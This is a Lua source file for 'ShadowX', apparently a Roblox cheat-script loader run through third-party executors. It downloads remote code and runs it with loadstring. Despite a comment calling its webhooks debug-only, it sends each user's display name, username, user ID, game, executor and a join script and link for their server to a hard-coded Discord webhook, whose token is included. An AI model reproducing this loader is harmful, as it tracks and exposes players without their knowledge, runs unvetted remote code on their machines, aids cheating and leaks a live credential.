-- ShadowX Loader
-- Services
local HttpService       = game:GetService("HttpService")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local MarketplaceService= game:GetService("MarketplaceService")
local CoreGui           = game:GetService("CoreGui")
local LocalPlayer       = Players.LocalPlayer

-- Sanity checks
assert(not RunService:IsServer(), "Invalid context")
assert(LocalPlayer ~= nil, "No local player")
assert(typeof(UserInputService) == "Instance", "Invalid environment")

-- URLs
local CONFIG_URL  = ""
local WEBHOOK_URL = "https://discord.com/api/webhooks/1500000787185537084/sTtB9I9Yzhz7jy4GfmZHjZO5J_2y4G-WCSNl3OblywUTOs1u_XVcp0uSx2-_3LDPTHM8"
local DISCORD_URL = "https://discord.gg/pk6WbGqZ5X"

-- HTTP request helper (supports syn, http, or fallback)
local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (typeof(request) == "function" and request)

local function fetch(url)
    if httpRequest then
        local ok, res = pcall(httpRequest, {
            Url    = url,
            Method = "GET",
            Headers = { ["Content-Type"] = "application/json" },
        })
        assert(ok and res and res.Body and res.Body ~= "", "Request failed")
        return res.Body
    else
        local ok, res = pcall(game.HttpGet, game, url, true)
        assert(ok and res and res ~= "", "Request failed")
        return res
    end
end

-- Warm-up HTTP (avoids cold-start issues on some executors)
local function warmupHttp()
    pcall(game.HttpGet, game, "https://www.roblox.com/game-pass/show-pass?id=0", true)
end

-- JSON decode
local function decodeJson(raw)
    local ok, result = pcall(HttpService.JSONDecode, HttpService, raw)
    assert(ok, "Decode failed")
    return result
end

-- Validate config payload
local function validatePayload(payload)
    assert(type(payload) == "table" and type(payload.games) == "table", "Invalid payload")
    return payload
end

-- Detect executor name
local function getExecutorName()
    if type(identifyexecutor) == "function" then
        local name, ver = identifyexecutor()
        if name and name ~= "" then
            return name .. (ver and (" " .. ver) or "")
        end
    end
    if     syn and syn.request                 then return SYNAPSE_LOADED and "Synapse X" or "Synapse Z"
    elseif KRNL_LOADED                         then return "KRNL"
    elseif isscriptware and isscriptware()     then return "Script-Ware"
    elseif FLUXUS_LOADED                       then return "Fluxus"
    elseif XENO_LOADED                         then return "Xeno"
    elseif DELTA_LOADED                        then return "Delta"
    elseif VULKAN_LOADED                       then return "Vulkan"
    elseif ELECTRON_LOADED                     then return "Electron"
    elseif SOLARA_LOADED                       then return "Solara"
    elseif WAVE_LOADED                         then return "Wave"
    elseif AWP_LOADED                          then return "AWP"
    elseif CELERY_LOADED                       then return "Celery"
    elseif http and http.request               then return "Unknown (http)"
    elseif type(request) == "function"         then return "Unknown (request)"
    else                                            return "Unknown"
    end
end

-- Show "Game Not Supported" notice
local function showUnsupportedNotice(discordUrl)
    local sg = Instance.new("ScreenGui")
    sg.Name           = "UnsupportedNotice"
    sg.ResetOnSpawn   = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.IgnoreGuiInset = true
    sg.Parent         = CoreGui

    local fr = Instance.new("Frame")
    fr.Size             = UDim2.new(0, 310, 0, 140)
    fr.Position         = UDim2.new(0.5, -155, 0.5, -70)
    fr.BackgroundColor3 = Color3.fromRGB(15, 15, 21)
    fr.BorderSizePixel  = 0
    fr.Parent           = sg
    Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 9)
    local frs = Instance.new("UIStroke", fr)
    frs.Color     = Color3.fromRGB(55, 55, 72)
    frs.Thickness = 1

    local hd = Instance.new("Frame")
    hd.Size             = UDim2.new(1, 0, 0, 38)
    hd.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    hd.BorderSizePixel  = 0
    hd.Parent           = fr
    Instance.new("UICorner", hd).CornerRadius = UDim.new(0, 9)

    local hdf = Instance.new("Frame")
    hdf.Size             = UDim2.new(1, 0, 0, 9)
    hdf.Position         = UDim2.new(0, 0, 1, -9)
    hdf.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    hdf.BorderSizePixel  = 0
    hdf.Parent           = hd

    local title = Instance.new("TextLabel")
    title.Size                   = UDim2.new(1, -44, 1, 0)
    title.Position               = UDim2.new(0, 13, 0, 0)
    title.BackgroundTransparency = 1
    title.Text                   = "⚠ ShadowX | Game Not Supported"
    title.TextColor3             = Color3.fromRGB(255, 200, 60)
    title.TextSize               = 13
    title.Font                   = Enum.Font.GothamBold
    title.TextXAlignment         = Enum.TextXAlignment.Left
    title.Parent                 = hd

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size             = UDim2.new(0, 26, 0, 26)
    closeBtn.Position         = UDim2.new(1, -32, 0, 6)
    closeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 46)
    closeBtn.Text             = "X"
    closeBtn.TextColor3       = Color3.fromRGB(140, 140, 158)
    closeBtn.TextSize         = 11
    closeBtn.Font             = Enum.Font.GothamBold
    closeBtn.BorderSizePixel  = 0
    closeBtn.Parent           = hd
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

    local div = Instance.new("Frame")
    div.Size             = UDim2.new(1, -26, 0, 1)
    div.Position         = UDim2.new(0, 13, 0, 38)
    div.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    div.BorderSizePixel  = 0
    div.Parent           = fr

    local body = Instance.new("TextLabel")
    body.Size                   = UDim2.new(1, -26, 0, 34)
    body.Position               = UDim2.new(0, 13, 0, 46)
    body.BackgroundTransparency = 1
    body.Text                   = "This game isn't supported yet. Recommend it in our Discord and we'll look into adding it!"
    body.TextColor3             = Color3.fromRGB(130, 130, 150)
    body.TextSize               = 11
    body.Font                   = Enum.Font.Gotham
    body.TextXAlignment         = Enum.TextXAlignment.Left
    body.TextWrapped            = true
    body.Parent                 = fr

    local linkBox = Instance.new("Frame")
    linkBox.Size             = UDim2.new(1, -26, 0, 30)
    linkBox.Position         = UDim2.new(0, 13, 0, 96)
    linkBox.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
    linkBox.BorderSizePixel  = 0
    linkBox.Parent           = fr
    Instance.new("UICorner", linkBox).CornerRadius = UDim.new(0, 6)
    local linkStroke = Instance.new("UIStroke", linkBox)
    linkStroke.Color     = Color3.fromRGB(45, 45, 60)
    linkStroke.Thickness = 1

    local linkLabel = Instance.new("TextLabel")
    linkLabel.Size                   = UDim2.new(1, -70, 1, 0)
    linkLabel.Position               = UDim2.new(0, 10, 0, 0)
    linkLabel.BackgroundTransparency = 1
    linkLabel.Text                   = discordUrl
    linkLabel.TextColor3             = Color3.fromRGB(88, 140, 255)
    linkLabel.TextSize               = 11
    linkLabel.Font                   = Enum.Font.Gotham
    linkLabel.TextXAlignment         = Enum.TextXAlignment.Left
    linkLabel.Parent                 = linkBox

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size             = UDim2.new(0, 54, 0, 22)
    copyBtn.Position         = UDim2.new(1, -58, 0.5, -11)
    copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    copyBtn.Text             = "Copy"
    copyBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
    copyBtn.TextSize         = 11
    copyBtn.Font             = Enum.Font.GothamBold
    copyBtn.BorderSizePixel  = 0
    copyBtn.Parent           = linkBox
    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 5)

    -- Draggable
    local dragging, dragOrigin, dragPos = false, nil, nil
    hd.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragOrigin = i.Position; dragPos = fr.Position
        end
    end)
    hd.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local delta = i.Position - dragOrigin
            fr.Position = UDim2.new(dragPos.X.Scale, dragPos.X.Offset + delta.X, dragPos.Y.Scale, dragPos.Y.Offset + delta.Y)
        end
    end)
    closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
    copyBtn.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(discordUrl)
            copyBtn.Text = "Copied!"
            task.delay(1.8, function() if copyBtn and copyBtn.Parent then copyBtn.Text = "Copy" end end)
        end
    end)
end

-- Webhook: send debug/error/warn events (only used in debug mode)
local debugColors = { debug = 7506394, error = 15158332, bug = 16744272, warn = 16776960 }
local sentJobs    = {}

local function sendWebhook(kind, msg, extra, placeStr, whUrl)
    if not httpRequest then return end
    local gameName = "Unknown"
    local ok, gn = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end)
    if ok then gameName = gn end

    local fields = {
        { name = "Kind",     value = kind,                                          inline = true  },
        { name = "Game",     value = gameName .. " [" .. placeStr .. "]",           inline = true  },
        { name = "Executor", value = getExecutorName(),                             inline = true  },
        { name = "Message",  value = "```\n" .. tostring(msg):sub(1, 900) .. "\n```", inline = false },
    }
    if extra then
        table.insert(fields, { name = "Extra", value = tostring(extra):sub(1, 300), inline = false })
    end

    pcall(httpRequest, {
        Url    = whUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            embeds = {{ title = "ShadowX Beta | " .. kind:upper(), color = debugColors[kind] or 8421504, fields = fields }}
        }),
    })
end

-- Webhook: check beta env issues
local function sendBetaEnvCheck(placeStr, whUrl)
    local bugs = {}
    if not setclipboard then table.insert(bugs, "setclipboard missing") end
    if not loadstring   then table.insert(bugs, "loadstring missing") end
    if not game.HttpGet then table.insert(bugs, "HttpGet unavailable") end
    if #bugs > 0 then
        sendWebhook("bug", "Env issues on beta load", table.concat(bugs, ", "), placeStr, whUrl)
    else
        sendWebhook("debug", "Beta loader initialized", "PlaceId: " .. placeStr, placeStr, whUrl)
    end
end

-- Webhook: send user join info
local function sendJoinInfo(placeStr, whUrl)
    if not httpRequest then return end
    if game.JobId ~= "" and sentJobs[game.JobId] then return end
    if game.JobId ~= "" then sentJobs[game.JobId] = true end

    local gameName = "Unknown"
    local ok, gn = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end)
    if ok then gameName = gn end

    local joinScript
    if game.JobId ~= "" then
        joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance('
            .. game.PlaceId .. ', "' .. game.JobId .. '", game:GetService("Players").LocalPlayer)'
    end

    local playerCount = #Players:GetPlayers() .. "/" .. tostring(Players.MaxPlayers)
    local executor    = getExecutorName()
    local lp          = LocalPlayer

    pcall(httpRequest, {
        Url    = whUrl,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            embeds = {{ title = "User Data", color = 5793266, fields = {
                { name = "Display Name", value = lp.DisplayName,                                                                              inline = true },
                { name = "Username",     value = lp.Name .. " (" .. lp.UserId .. ")",                                                        inline = true },
                { name = "Game",         value = gameName,                                                                                    inline = true },
                { name = "Players",      value = playerCount,                                                                                 inline = true },
                { name = "Executor",     value = executor,                                                                                    inline = true },
                { name = "Join Script",  value = "`" .. (joinScript or "N/A") .. "`",                                                        inline = true },
                { name = "Join Link",    value = "https://jv3xz0.netlify.app/?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId, inline = true },
            }}},
        }),
    })
end

-- Show Discord notice to user
local function showDiscordNotice()
    local sg = Instance.new("ScreenGui")
    sg.Name           = "LoaderNotice"
    sg.ResetOnSpawn   = false
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    sg.IgnoreGuiInset = true
    sg.Parent         = CoreGui

    local fr = Instance.new("Frame")
    fr.Size             = UDim2.new(0, 310, 0, 124)
    fr.Position         = UDim2.new(0.5, -155, 0.5, -62)
    fr.BackgroundColor3 = Color3.fromRGB(15, 15, 21)
    fr.BorderSizePixel  = 0
    fr.Parent           = sg
    Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 9)
    local frs = Instance.new("UIStroke", fr)
    frs.Color     = Color3.fromRGB(55, 55, 72)
    frs.Thickness = 1

    local hd = Instance.new("Frame")
    hd.Size             = UDim2.new(1, 0, 0, 38)
    hd.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    hd.BorderSizePixel  = 0
    hd.Parent           = fr
    Instance.new("UICorner", hd).CornerRadius = UDim.new(0, 9)

    local hdf = Instance.new("Frame")
    hdf.Size             = UDim2.new(1, 0, 0, 9)
    hdf.Position         = UDim2.new(0, 0, 1, -9)
    hdf.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    hdf.BorderSizePixel  = 0
    hdf.Parent           = hd

    local title = Instance.new("TextLabel")
    title.Size                   = UDim2.new(1, -44, 1, 0)
    title.Position               = UDim2.new(0, 13, 0, 0)
    title.BackgroundTransparency = 1
    title.Text                   = "ShadowX | Discord Server"
    title.TextColor3             = Color3.fromRGB(215, 215, 230)
    title.TextSize               = 13
    title.Font                   = Enum.Font.GothamBold
    title.TextXAlignment         = Enum.TextXAlignment.Left
    title.Parent                 = hd

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size             = UDim2.new(0, 26, 0, 26)
    closeBtn.Position         = UDim2.new(1, -32, 0, 6)
    closeBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 46)
    closeBtn.Text             = "X"
    closeBtn.TextColor3       = Color3.fromRGB(140, 140, 158)
    closeBtn.TextSize         = 11
    closeBtn.Font             = Enum.Font.GothamBold
    closeBtn.BorderSizePixel  = 0
    closeBtn.Parent           = hd
    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 5)

    local div = Instance.new("Frame")
    div.Size             = UDim2.new(1, -26, 0, 1)
    div.Position         = UDim2.new(0, 13, 0, 38)
    div.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    div.BorderSizePixel  = 0
    div.Parent           = fr

    local lbl = Instance.new("TextLabel")
    lbl.Size                   = UDim2.new(1, -26, 0, 24)
    lbl.Position               = UDim2.new(0, 13, 0, 46)
    lbl.BackgroundTransparency = 1
    lbl.Text                   = "Join our Discord for further support and always updated!"
    lbl.TextColor3             = Color3.fromRGB(130, 130, 150)
    lbl.TextSize               = 11
    lbl.Font                   = Enum.Font.Gotham
    lbl.TextXAlignment         = Enum.TextXAlignment.Left
    lbl.TextWrapped            = true
    lbl.Parent                 = fr

    local linkBox = Instance.new("Frame")
    linkBox.Size             = UDim2.new(1, -26, 0, 30)
    linkBox.Position         = UDim2.new(0, 13, 0, 78)
    linkBox.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
    linkBox.BorderSizePixel  = 0
    linkBox.Parent           = fr
    Instance.new("UICorner", linkBox).CornerRadius = UDim.new(0, 6)
    local linkStroke = Instance.new("UIStroke", linkBox)
    linkStroke.Color     = Color3.fromRGB(45, 45, 60)
    linkStroke.Thickness = 1

    local linkLabel = Instance.new("TextLabel")
    linkLabel.Size                   = UDim2.new(1, -70, 1, 0)
    linkLabel.Position               = UDim2.new(0, 10, 0, 0)
    linkLabel.BackgroundTransparency = 1
    linkLabel.Text                   = DISCORD_URL
    linkLabel.TextColor3             = Color3.fromRGB(88, 140, 255)
    linkLabel.TextSize               = 11
    linkLabel.Font                   = Enum.Font.Gotham
    linkLabel.TextXAlignment         = Enum.TextXAlignment.Left
    linkLabel.Parent                 = linkBox

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size             = UDim2.new(0, 54, 0, 22)
    copyBtn.Position         = UDim2.new(1, -58, 0.5, -11)
    copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    copyBtn.Text             = "Copy"
    copyBtn.TextColor3       = Color3.fromRGB(255, 255, 255)
    copyBtn.TextSize         = 11
    copyBtn.Font             = Enum.Font.GothamBold
    copyBtn.BorderSizePixel  = 0
    copyBtn.Parent           = linkBox
    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 5)

    -- Draggable
    local dragging, dragOrigin, dragPos = false, nil, nil
    hd.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true; dragOrigin = i.Position; dragPos = fr.Position
        end
    end)
    hd.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local delta = i.Position - dragOrigin
            fr.Position = UDim2.new(dragPos.X.Scale, dragPos.X.Offset + delta.X, dragPos.Y.Scale, dragPos.Y.Offset + delta.Y)
        end
    end)
    closeBtn.MouseButton1Click:Connect(function() sg:Destroy() end)
    copyBtn.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(DISCORD_URL)
            copyBtn.Text = "Copied!"
            task.delay(1.8, function() if copyBtn and copyBtn.Parent then copyBtn.Text = "Copy" end end)
        end
    end)
end

-- ─── Main ────────────────────────────────────────────────────────────────────

warmupHttp()

-- Fetch and parse config
local rawJson  = fetch(CONFIG_URL)
assert(#rawJson > 20, "Payload too short")
local payload  = validatePayload(decodeJson(rawJson))
rawJson = nil

-- Ban check
local username = LocalPlayer.Name
if type(payload.banned) == "table" then
    for _, banned in ipairs(payload.banned) do
        if banned == username then
            payload = nil
            LocalPlayer:Kick("You are banned. Appeal at " .. DISCORD_URL)
            return
        end
    end
end

-- Game lookup
local placeStr  = tostring(game.PlaceId)
local gameEntry = payload.games[placeStr]
payload = nil

if not gameEntry then
    showUnsupportedNotice(DISCORD_URL)
    return
end

-- Parse game entry
local scriptUrl  = type(gameEntry) == "table" and (gameEntry.script or "") or tostring(gameEntry)
local isDebug    = type(gameEntry) == "table" and gameEntry.debug == true or false
local betaUrl    = type(gameEntry) == "table" and (gameEntry.beta or "") or ""
local testers    = type(gameEntry) == "table" and type(gameEntry.testers) == "table" and gameEntry.testers or {}
gameEntry = nil

local isTester = false
for _, t in ipairs(testers) do
    if t == username then isTester = true; break end
end
testers = nil; username = nil

local targetUrl = (isDebug and isTester and betaUrl ~= "") and betaUrl or scriptUrl
scriptUrl = nil; betaUrl = nil
assert(targetUrl and targetUrl ~= "", "No script URL configured for this game")

-- Webhooks
sendJoinInfo(placeStr, WEBHOOK_URL)
if isDebug and isTester then sendBetaEnvCheck(placeStr, WEBHOOK_URL) end

-- Show Discord notice
showDiscordNotice()

-- Load and execute game script
do
    local body = fetch(targetUrl)
    targetUrl  = nil

    local fn, err = loadstring(body)
    body = nil

    if not fn then
        if isDebug and isTester then
            sendWebhook("error", "Compile error", err, placeStr, WEBHOOK_URL)
        end
        assert(false, "Compile error: " .. tostring(err))
    end

    local ok, runErr = pcall(fn)
    fn = nil

    if not ok then
        if isDebug and isTester then
            sendWebhook("error", "Runtime error", runErr, placeStr, WEBHOOK_URL)
        end
        assert(false, "Runtime error: " .. tostring(runErr))
    end

    if isDebug and isTester then
        sendWebhook("debug", "Script executed OK", "PlaceId: " .. placeStr, placeStr, WEBHOOK_URL)
    end
end
